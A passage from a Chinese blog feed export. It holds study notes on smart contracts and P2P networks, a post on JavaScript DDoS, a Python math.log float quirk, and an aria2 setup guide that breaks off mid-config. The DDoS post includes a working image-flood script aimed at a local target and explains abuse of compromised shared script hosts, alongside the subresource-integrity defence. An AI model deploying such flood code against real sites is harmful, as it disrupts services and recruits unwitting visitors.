<strong>智能合约实际上是采用某种语言编写的、计算机或目标可理解的计算机程序</strong>.此外，智能合约还包含了以业务逻辑形式出现的各方之间的协议.另一个核心理念是，当某些条件满足时，智能契约将自动执行.另外，<strong>强制性</strong>意味着所有的合约条款都是按照规定和预期执行的，对于攻击者而言同样如此.</p><p>​        智能合约还具备<strong>安全性以及“不可阻挡”性</strong>，也就是说，计算机程序必须以这样一种方式设计：在合理的时间范围内具备容错能力并保持执行状态，即使外部因素处于不利状态下，相关程序也应能够执行和维护一个健康的内部状态.</p><p>​        智能合约应该具备<strong>确定性</strong>.据此，网络上的任何节点运行同一个智能合约，并获得相同的结果.如果最终结果在节点之间略有不同，那么将无法达成共识，因此，区块链上分布式共识的整个范例可能会失效.</p><ul><li><p>智能合约的<strong>优点</strong>：</p><ul><li>高效的实时更新</li><li>准确执行</li><li>较低的人为干预风险</li><li>去中心化权威</li><li>较低的运行成本</li></ul></li><li><p>智能合约的<strong>缺点</strong>：</p><ul><li>漏洞无法修复</li><li>隐私保护风险</li><li>缺乏有效监管</li><li>无法完全实施</li></ul></li></ul><h5 id="智能合约The-DAO事件："><a href="#智能合约The-DAO事件：" class="headerlink" title="智能合约The DAO事件："></a>智能合约The DAO事件：</h5><p>DAO是最高的众筹项目之一，于2016年4月启动</p><p>DAO遭受攻击后，创建了硬分叉用于修复，但违背了去中心化的理念。</p><h4 id="以太坊虚拟机"><a href="#以太坊虚拟机" class="headerlink" title="以太坊虚拟机"></a>以太坊虚拟机</h4><p>以太坊虚拟机时以太网上智能合约的运行环境</p><p>特点有①高度脚本化的设计语言使得智能合约的开发更简单；②和以太坊区块链一样同时存储于各个节点计算机上；③简单式堆栈架构，可应用于256位的Keccak散列算法和椭圆曲线计算；④可处理异常执行，包括堆栈溢出和无效指令等；⑤图灵完备，支持任何种类的计算，代码执行受参数Gas的严格制约。</p><h3 id="智能合约的使用步骤"><a href="#智能合约的使用步骤" class="headerlink" title="智能合约的使用步骤"></a>智能合约的使用步骤</h3><p>①编译合约===&gt;&gt;&gt;②创建合约===&gt;&gt;&gt;③部署合约===&gt;&gt;&gt;④调用合约===&gt;&gt;&gt;⑤监听合约||⑤销毁合约；</p><h4 id="编译智能合约"><a href="#编译智能合约" class="headerlink" title="编译智能合约"></a>编译智能合约</h4><p>以太坊上的合约就是一段可以被虚拟机执行的代码，这些代码以以太坊特有的二进制的形式存储在区块链上，并由以太坊虚拟机解释，因此被称为以太坊虚拟机位码。目前，用于以太坊智能合约开发的语言主要由Solidity、Serpent、LLL。</p><p>Solidity作为最流行的智能合约语言， 以其简单易用和高可读性受到以太坊设计者们的推荐</p><h4 id="创建智能合约"><a href="#创建智能合约" class="headerlink" title="创建智能合约"></a>创建智能合约</h4><p>创建合约，需要输入合约名称，合约版本号、合约创建者、合约的内容等</p><h4 id="部署智能合约"><a href="#部署智能合约" class="headerlink" title="部署智能合约"></a>部署智能合约</h4><p>部署合约就是将编译好的合约字节码通过外部账户发送交易的形式部署到以太坊区块链上，部署合约时，需要支付费用，要确保账户里有足够的余额（可以创建自己独立的测试网络，即自己的区块链，初始化的时候就可以初始化一些有余额的账户）。部署合约的一般流程：</p><p>①输入命令，部署合约；</p><p>②查看交易池待处理状况，如有待确认的交易，查看交易内容；</p><p>③查看挖矿日志，检验交易是否已发送到以太坊区块链上；</p><p>④等待矿工确认，利用<code>txpool.status</code>命令查看交易池状态；</p><p>⑤利用<code>eth.getblock</code>命令查看区块中是否含有关于合约的交易。</p><h4 id="调用智能合约"><a href="#调用智能合约" class="headerlink" title="调用智能合约"></a>调用智能合约</h4><p>智能合约的调用需要两个字段：和约地址（表明调用哪个合约）和合约abi(application binaryinterface)（表明具体用合约的哪个方法）</p><p>原因：首先，合约内容是可以完全重复的，所以我们根据合约名字、合约内容或者合约内容的哈希，去调用某一个合约都是可能重复的，只有合约地址是不会重复的。另外，合约内的函数名是可以重载的，就是说我们可以有多个叫setValue的函数，但是所需要的传入参数不同。EVM中使用了abi，便于调用，同时还能区分不同的函数。调用合约的一般流程：</p><p>①利用<code>eth.contract</code>来定义一个合约类，定义的合约类遵循ABI定义，构建合约实例</p><p>②调用合约</p><h4 id="监听智能合约"><a href="#监听智能合约" class="headerlink" title="监听智能合约"></a>监听智能合约</h4><p>合约部署后，可设置监听，既可以实时监控事件，也可以从历史区块中检索 event。</p><h4 id="销毁智能合约"><a href="#销毁智能合约" class="headerlink" title="销毁智能合约"></a>销毁智能合约</h4><p>合约也可以结束，当一个合约通过kill方法将其杀死，那么我们将不能再和这个合约进行交互，如果一个合约被销毁，那么当前地址指向的是一个僵尸对象，这个僵尸对象调用任何方法都会抛出异常。此时需要调用selfdestruct(address)才能将其进行销毁。</p><p>需要指出的是只有<strong>拥有者</strong>才能销毁合约。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><h4 id="数字身份"><a href="#数字身份" class="headerlink" title="数字身份"></a>数字身份</h4><p>智能合约可以允许个人拥有并且控制包含数据、信誉和数字资产在内的数字身份。它允许个人自己决定向对手公开的数据内容，更为企业提供无缝了解客户的机会。</p><p>交易对手将不能获取敏感数据来验证交易。这减少了责任，同时促进了解你的客户法规（KYC）要求的无摩擦化，还提高了合规性，可恢复性和互操作性。</p><h4 id="记录"><a href="#记录" class="headerlink" title="记录"></a>记录</h4><p>智能合同可以将统一商业代码（Uniform Commercial Code，UCC）归档数字化，并且自动更新发布流程。他们还可以自动地完善贷款人的贷款担保物权。它们可以自动遵守在将来销毁所要求记录的规则。不仅如此，还能通过UCC留置权自动解锁，自动更新或自动请求抵押品。在执行此类功能时，智能合同能够降低法律成本。</p><h4 id="证券"><a href="#证券" class="headerlink" title="证券"></a>证券</h4><p>智能合约可以简化资本构成表的管理。它们还绕开证券托管链中的中间人，并促进自动支付股息，股票分拆和负债管理，同时降低操作风险。智能合约能将分布式账本上证券的工作流程数字化。</p><h4 id="贸易金融"><a href="#贸易金融" class="headerlink" title="贸易金融"></a>贸易金融</h4><p>智能合约可以通过快速信用证和贸易支付开启来简化国际货物转移，同时获得更大的金融资产的流动性，提高买家，供应商和机构的融资效率。此外，政府必须确定在执行失败的情况下，特别是在纠纷和违约的情况下，法律应当如何界定责任。</p><p>对于贸易金融而言，结算系统、技术要求和离散生态系统的整合是重要的三元素。</p><h4 id="供应链"><a href="#供应链" class="headerlink" title="供应链"></a>供应链</h4><p>智能合约可以让供应链中的每一步变得实时可见。互联网设备可以将产品从工厂车间转移到商店货架之间的每个步骤都记录下来。它们促进粒度级别的库存跟踪，这有利于保护供应链的融资、保险和风险。这种增强的跟踪和验证技术降低了盗窃和欺诈的风险。如果想让智能合约实现大规模应用，供应链参与者必须证明其身份，包括公司，机构，个人，传感器，设施和产品等。</p><h4 id="汽车保险"><a href="#汽车保险" class="headerlink" title="汽车保险"></a>汽车保险</h4><p>智能合约可以改善目前混乱的汽车投保及赔付流程。智能合约可以记录相关政策、驾驶记录和驾驶员报告，允许互联网车辆在发生事故后立即执行索赔。合约能够自动处理索赔，验证和付款过程。每个投保人的存储库中都包括了驾驶记录，车辆和事故报告历史。消除重复的报告也会节省成本。不过，这些都需要跨行业协作来解决技术，监管和财务上的挑战。</p><h2 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h2><h3 id="p2p简介"><a href="#p2p简介" class="headerlink" title="p2p简介"></a>p2p简介</h3><p>定义：</p><p>网络的参与者共享他们所拥有的一部分硬件资源（处理能力、存储能力、网络连接能力、打印机等），这些共享资源通过网络提供服务和内容，能被其它对等节点(Peer)直接访问而无需经过中间实体。在此网络中的参与者既是资源（服务和内容）提供者（Server），又是资源获取者（Client）。</p><h3 id="P2P网络原理"><a href="#P2P网络原理" class="headerlink" title="P2P网络原理"></a>P2P网络原理</h3><p>从计算模式上来说，P2P打破了传统的Client/Server (C/S)模式，在网络中的每个结点的地位都是对等的。每个结点既充当服务器，为其他结点提供服务，同时也享用其他结点提供的服务。</p><p>P2P改变了目前互联网中占主导地位的客户/服务器结构中信息在消费者和生产者之间的不平衡。由于P2P网络没有中心节点（中心服务器），网络中的每个节点具有信息消费者和信息提供者的双重身份P2P，同时具有信息通信方面的功能，因此P2P应用的实现扩展性强，实现方式灵活多样，部署成本低，给互联网的发布和共享带来了巨大的空间。</p><h3 id="P2P特点"><a href="#P2P特点" class="headerlink" title="P2P特点"></a>P2P特点</h3><ul><li><p><strong>P2P是动态的</strong>：动态地提供信息和服务</p></li><li><p><strong>P2P是双向的</strong>：切实实现信息和服务的交换与共享</p></li><li><p><strong>P2P是直接的</strong>：无中介、等级和格式限制，直接交换信息和服务</p></li><li><p><strong>P2P是平等的</strong>：生产者与消费者地位平等，角色合二为一</p></li><li><p><strong>P2P是及时的</strong>：无服务器参与空间分配，可提供实时、可升级的信息</p></li><li><p><strong>P2P是有效的</strong>：可充分利用个人计算机的硬件设备、传输信息和服务时目标确定</p></li></ul><h3 id="P2P优势"><a href="#P2P优势" class="headerlink" title="P2P优势"></a>P2P优势</h3><ul><li><p>非中心化</p><p>网络中的资源和服务分散在所有节点上，信息传输和服务的实现都直接在节点之间进行，可以无需中间环节和服务器的介入，避免了可能的瓶颈。</p></li><li><p>可扩展性</p><p> 在P2P网络中，节点在获取其他节点资源的同时也为其他节点服务。随着用户的加入，不仅服务的需求增加了，系统整体的资源和服务能力也在同步扩充，始终能较便捷地满足用户的需求。</p></li><li><p>健壮性</p><p>P2P网络通常都是以自组织的方式建立起来的，并允许节点自由地加入和离开。由于服务是分散在各个节点之间进行的，当部分节点或网络遭到破坏时，对其他部分的影响很小。</p></li><li><p>高性价比</p><p>采用P2P架构可以有效地利用互联网中散步的大量普通节点，将计算任务或存储资料分布到所有节点上，利用其中空置的计算能力或存储空间达到高性能计算和海量存储的目的。</p></li><li><p>隐私保护</p><p>在P2P中，所有参与者可以提供中继转发的功能，因此大大提高了匿名通信的灵活性和可靠性，能够为用户提供更好的隐私保护。</p></li><li><p>负载均衡</p><p>在P2P网络环境下由于每个节点既是服务器又是客户端，减少了对传统C/S结构中服务器计算能力、存储能力的要求，同时由于资源分布在多个节点，因此能更好地实现整个网络的负载均衡。</p></li></ul><h3 id="P2P加密"><a href="#P2P加密" class="headerlink" title="P2P加密"></a>P2P加密</h3><ul><li><p>文件内容共享和下载，例如Napster、Gnutella、eDonkey等</p></li><li><p>计算能力和存储共享，例如SETI@home、Avaki等</p></li><li><p>基于P2P技术的协同与服务共享平台，例如JXTA等</p></li><li><p>即时通讯工具，包括ICQ、QQ、Yahoo Messenger等</p></li><li><p>P2P通讯与信息共享，例如Skype、Crowds、Onion Routing等；</p></li><li><p>基于P2P技术的网络电视：沸点、PPStream、 PPLive、 QQLive、 SopCast等。</p></li></ul><h3 id="拓扑结构"><a href="#拓扑结构" class="headerlink" title="拓扑结构"></a>拓扑结构</h3><p>拓扑结构是指分布式系统中各个计算单元之间的物理或逻辑的互联关系，结点之间的拓扑结构一直是确定系统类型的重要依据。</p><h4 id="P2P网络的拓扑结构"><a href="#P2P网络的拓扑结构" class="headerlink" title="P2P网络的拓扑结构"></a>P2P网络的拓扑结构</h4><p> 根据结构关系可以将P2P系统细分为四种拓扑形式：</p><ul><li><p><strong>中心化拓扑</strong>（Centralized Topology）</p></li><li><p><strong>全分布式非结构化拓扑</strong>（Decentralized Unstructured Topology）</p></li><li><p><strong>全分布式结构化拓扑</strong>（Decentralized Structured Topology，也称作DHT网络）</p></li><li><p><strong>半分布式拓扑</strong>（Partially Decentralized Topology）</p></li></ul><h4 id="中心化拓扑结构"><a href="#中心化拓扑结构" class="headerlink" title="中心化拓扑结构"></a>中心化拓扑结构</h4><p>即存在一个中心节点保存了其他所有节点的索引信息，索引信息一般包括IP地址、端口、节点资源等。</p><p>Napster是最早出现的P2P系统之一，它的工作原理如图所示。当某个用户需要某个音乐文件时，首先连接到Napster中央索引服务器，在服务器上进行检索，服务器返回存有该文件的用户信息，再由请求者直接连到文件的所有者传输文件。Napster首先实现了文件查询与文件传输的分离，有效地节省了中央服务器的带宽消耗，减少了系统的文件传输延时。</p><ul><li><p><strong>优点</strong></p><ul><li>维护简单、资源发现效率高</li></ul></li><li><p><strong>缺点</strong></p><ul><li>中央索引服务器的瘫痪容易导致整个网络的崩溃，因此可靠性和安全性较低。</li><li>随着网络规模的扩大，对中央索引服务器进行维护和更新的费用将急剧增加，所需成本较高。</li><li>中央索引服务器的存在常引起版权问题上的纠纷，服务提供商容易被追究法律责任。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> StudyNote </tag>
            
            <tag> BlockChain </tag>
            
            <tag> bitcoin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDoS-JavaScript</title>
      <link href="/2019/12/12/DDoS-Javascript/"/>
      <url>/2019/12/12/DDoS-Javascript/</url>
      
        <content type="html"><![CDATA[<h1 id="关于JavaScript的DDoS攻击"><a href="#关于JavaScript的DDoS攻击" class="headerlink" title="关于JavaScript的DDoS攻击"></a>关于JavaScript的DDoS攻击</h1><blockquote><p>引用：</p><p><a href="https://www.freebuf.com/news/66447.html" target="_blank" rel="noopener">https://www.freebuf.com/news/66447.html</a></p></blockquote><h3 id="该攻击属于应用层攻击"><a href="#该攻击属于应用层攻击" class="headerlink" title="该攻击属于应用层攻击"></a>该攻击属于应用层攻击</h3><ul><li><strong>Javascript实现DDos攻击原理分析</strong></li></ul><blockquote><p>　　现在网站的交互性都是通过JavaScript来实现的。通过添加JavaScript直接插入HTML元素，或通过远程来加载JavaScript。浏览器会读取script标签中的src属性并运行它所指向的脚本，其实不只是script标签可以用来攻击，简单来说只要是可以跨域访问的标签，如img，link等都可以实现DDos攻击。</p><p>　　既然这些标签可以访问外站的资源，那么我们是不是就可以设个定时器无限访问这个网站，从而达到攻击呢，那是肯定的。</p></blockquote><p><img src="https://magic-king.net/images/loading.gif" data-original="DDoS-Javascript/1.jpg"></p><p>如果攻击者在一个网站中嵌入了恶意JavaScript脚本，那么该网站的每一个访客都将成为DDoS攻击中的一员。网站流量越高就意味着DDoS越严重。</p><p><strong>入侵共享JavaScript的第三方服务器</strong></p><p>许多网站使用的都是普通的JavaScript库，为了节约带宽、提升性能，通常还会将JavaScript脚本共享在第三方服务器上。也就是说如果网站上包含有指向第三方服务器的脚本标签，就意味着所有访问该网站的用户都将自动下载JavaScript脚本，并执行。不幸的是，如果攻击者入侵了该第三方服务器并在JavaScript脚本中注入了DDoS攻击代码，那结果可想而知了，所有的访客也将变成DDoS攻击中的一员。</p><p>一段简单的JS代码就能发起DoS攻击</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">imgflood</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">4<span class="comment">//var TARGET = 'victim-website.com'</span></span><br><span class="line">4<span class="keyword">var</span> TARGET = <span class="string">"127.0.0.1:12345"</span></span><br><span class="line">4<span class="keyword">var</span> URI = <span class="string">'/index?'</span></span><br><span class="line">4<span class="keyword">var</span> pic = <span class="keyword">new</span> Image()</span><br><span class="line">4<span class="keyword">var</span> rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">1000</span>)</span><br><span class="line">4pic.src = <span class="string">'http://'</span>+TARGET+URI+<span class="string">'val='</span>+rand</span><br><span class="line">4<span class="comment">//pic.src = 'http://'+TARGET+URI+'val='+rand</span></span><br><span class="line">&#125;</span><br><span class="line">setInterval(imgflood, <span class="number">10</span>)</span><br><span class="line">alert(pic.src)</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">f*********************king</span><br><span class="line">&lt;script type=<span class="string">'text/javascript'</span>&gt;imgflood()&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br></pre></td></tr></table></figure><p><code>setInterval(code, millisec)</code>:以millisec 毫秒的间隔执行code</p><p>由于大部分网页引用jquery是从外部引用的，因此可以从此发起中间人攻击</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-1.10.2.min.js"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><p>预防的话，就是通过script标签支持的属性integrity：这个属性支持验证该js脚本的hash值，确保不会引用来自外部恶意的js脚本</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-1.10.2.min.js"</span>  </span></span><br><span class="line"><span class="tag">        <span class="attr">integrity</span>=<span class="string">"sha256-C6CB9UYIS9UJeqinPHWTHVqh/E1uhG5Twh+Y5qFQmYg="</span></span></span><br><span class="line"><span class="tag">         <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure><p>中间人攻击示意图：攻击其中的请求外部js的途径</p><p><img src="https://magic-king.net/images/loading.gif" data-original="DDoS-Javascript/2.jpg" alt></p><hr><p><strong>在写js-DDoS的问题</strong>：</p><h4 id="HTML引入外部js脚本，放在head中不起作用-放在body中才起作用"><a href="#HTML引入外部js脚本，放在head中不起作用-放在body中才起作用" class="headerlink" title="HTML引入外部js脚本，放在head中不起作用,放在body中才起作用"></a><a href="https://blog.csdn.net/SeekAndFindYou/article/details/82219815" target="_blank" rel="noopener">HTML引入外部js脚本，放在head中不起作用,放在body中才起作用</a></h4><p>这是因为加载HTML文档时，先加载了js脚本后就不起作用了。<br>一般引入外部css文件放在head中，引入外部js脚本放在body中。<br>先渲染HTML文档(css)，再加载特效(js)</p>]]></content>
      
      
      <categories>
          
          <category> DDoS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DDoS </tag>
            
            <tag> Network </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tricks</title>
      <link href="/2019/12/01/tricks/"/>
      <url>/2019/12/01/tricks/</url>
      
        <content type="html"><![CDATA[<h1 id="To-record-some-strange-tricks"><a href="#To-record-some-strange-tricks" class="headerlink" title="To record some strange tricks"></a>To record some strange tricks</h1><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h5 id="1-something-about-math-log"><a href="#1-something-about-math-log" class="headerlink" title="1.something about math.log"></a>1.something about math.log</h5><p>如图，当math.log(125,5)时应该值为3的，但是出了一个bug</p><p><img src="https://magic-king.net/images/loading.gif" data-original="tricks\1.jpg" alt></p><p>好奇心驱使我去写一个脚本看看，然后发现这些能hack math.log函数的不在少数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">101</span>):</span><br><span class="line">4<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">44ij = i**j</span><br><span class="line">        <span class="keyword">if</span> math.log(ij, i) != j:</span><br><span class="line">            print(i,<span class="string">'\t'</span>,j)</span><br></pre></td></tr></table></figure><p>然后去ubuntu虚拟机尝试了python2，发现也有这个问题</p><p><img src="https://magic-king.net/images/loading.gif" data-original="tricks\2.jpg" alt></p><p>看了官方文档，发现有底数的对数函数是通过换底公式实现的，统一换成以e为底的对数去计算，因此会有除法的溢出导致以上问题。</p><blockquote><ul><li><p><code>math.`</code>log`(<em>x</em>[, <em>base</em>]) </p><p>With one argument, return the natural logarithm of <em>x</em> (to base  <em>e</em>). With two arguments, return the logarithm of <em>x</em> to the given  <em>base</em>, calculated as <code>log(x)/log(base)</code>.</p></li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">math.log(x[,base]) = log(x) / log(base)</span><br></pre></td></tr></table></figure><p>哪怕是<code>math.log(x**y,x)</code>也会有这个问题。</p><p>最有力的证明：</p><p><img src="https://magic-king.net/images/loading.gif" data-original="tricks\3.jpg" alt></p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>aria2</title>
      <link href="/2019/11/27/aria2/"/>
      <url>/2019/11/27/aria2/</url>
      
        <content type="html"><![CDATA[<h1 id="Aria2"><a href="#Aria2" class="headerlink" title="Aria2"></a>Aria2</h1><blockquote><p>参考：</p><p><a href="http://aria2.github.io/" target="_blank" rel="noopener">aria2</a></p><p><a href="http://aria2.github.io/manual/en/html/aria2c.html" target="_blank" rel="noopener">aria2 manual</a></p><p><a href="https://github.com/aria2/aria2" target="_blank" rel="noopener">github-aria2</a> </p><p><a href="https://zhuanlan.zhihu.com/p/21831960" target="_blank" rel="noopener">Windows 下如何配置 Aria 2</a></p><p><a href="https://www.htcp.net/3664.html" target="_blank" rel="noopener">AriaNg 强大的 Aria2 Web 端 安装及使用</a></p></blockquote><blockquote><p>webui配置：</p><p><a href="http://aria2c.com/usage.html" target="_blank" rel="noopener">YAAW</a></p><p> <a href="http://ariang.mayswind.net/zh_Hans/" target="_blank" rel="noopener">AriaNg</a></p></blockquote><p>由于不想下载可爱的迅雷，于是搜索搜索就得到了这个下载工具——Aria2</p><p>这东西不仅可以当作下载器，而且可以支持各种协议，包括bt等等</p><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><p>1.进入官方页面 <a href="https://aria2.github.io/" target="_blank" rel="noopener">Aria2</a>，也可以去官方github的项目地址 <a href="https://github.com/aria2/aria2/releases/tag/release-1.35.0" target="_blank" rel="noopener">https://github.com/aria2/aria2/releases/tag/release-1.35.0</a> 下载release包，也可以下源码自己编译。</p><p>2.下载之后解压至目录下，然后再该目录下新建以下4个文件</p><blockquote><ul><li>Aria2.log：日志，空文件即可</li><li>aria2.session：下载历史，空文件即可</li><li>aria2.conf：配置文件</li><li>run.bat or run.vbs：用于自动启动或隐藏窗口，可选</li></ul></blockquote><p>Aria2.conf如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># '#'开头为注释内容, 选项都有相应的注释说明, 根据需要修改 ##</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 被注释的选项填写的是默认值, 建议在需要修改时再取消注释  ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 文件保存相关 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件的保存路径(可使用绝对路径或相对路径), 默认: 当前启动位置</span></span><br><span class="line">dir=aira2/downloads</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启用磁盘缓存, 0为禁用缓存, 需1.16以上版本, 默认:16M</span></span><br><span class="line"><span class="meta">#</span><span class="bash">disk-cache=32M</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件预分配方式, 能有效降低磁盘碎片, 默认:prealloc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 预分配所需时间: none &lt; falloc ? trunc &lt; prealloc</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> falloc和trunc则需要文件系统和内核支持</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> NTFS建议使用falloc, EXT3/4建议trunc, MAC 下需要注释此项</span></span><br><span class="line"><span class="meta">#</span><span class="bash">file-allocation=none</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 断点续传</span></span><br><span class="line">continue=true</span><br><span class="line"></span><br><span class="line">log=aria2/aria2.log</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 下载连接相关 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最大同时下载任务数, 运行时可修改, 默认:5</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-concurrent-downloads=5</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 同一服务器连接数, 添加时可指定, 默认:1</span></span><br><span class="line">max-connection-per-server=5</span><br><span class="line"><span class="meta">#</span><span class="bash"> 最小文件分片大小, 添加时可指定, 取值范围1M -1024M, 默认:20M</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 假定size=10M, 文件为20MiB 则使用两个来源下载; 文件为15MiB 则使用一个来源下载</span></span><br><span class="line">min-split-size=10M</span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务最大线程数, 添加时可指定, 默认:5</span></span><br><span class="line"><span class="meta">#</span><span class="bash">split=5</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 整体下载速度限制, 运行时可修改, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-overall-download-limit=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务下载速度限制, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-download-limit=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 整体上传速度限制, 运行时可修改, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-overall-upload-limit=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 单个任务上传速度限制, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-upload-limit=0</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 禁用IPv6, 默认:<span class="literal">false</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">disable</span>-ipv6=<span class="literal">true</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 连接超时时间, 默认:60</span></span><br><span class="line"><span class="meta">#</span><span class="bash">timeout=60</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 最大重试次数, 设置为0表示不限制重试次数, 默认:5</span></span><br><span class="line"><span class="meta">#</span><span class="bash">max-tries=5</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置重试等待的秒数, 默认:0</span></span><br><span class="line"><span class="meta">#</span><span class="bash">retry-wait=0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 进度保存相关 ##</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 从会话文件中读取下载任务</span></span><br><span class="line">input-file=aria2/aria2.session</span><br><span class="line"><span class="meta">#</span><span 